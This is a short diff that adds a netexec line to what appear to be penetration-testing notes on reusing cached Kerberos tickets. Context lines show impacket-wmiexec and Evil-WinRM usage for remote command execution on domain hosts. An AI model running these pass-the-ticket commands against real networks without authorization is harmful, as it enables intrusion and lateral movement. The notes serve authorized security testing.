@@ -249,6 +249,9 @@ export KRB5CCNAME=$PATH/krb5cc_
 # Using wmiexec
 impacket-wmiexec $COMPUTER_NAME -k
 
+# Using netexec
+netexec smb $COMPUTER_NAME -k --use-kcache
+
 # Evil winrm
 ## sudo apt-get install krb5-user -y
 ## Check /etc/krb5.conf
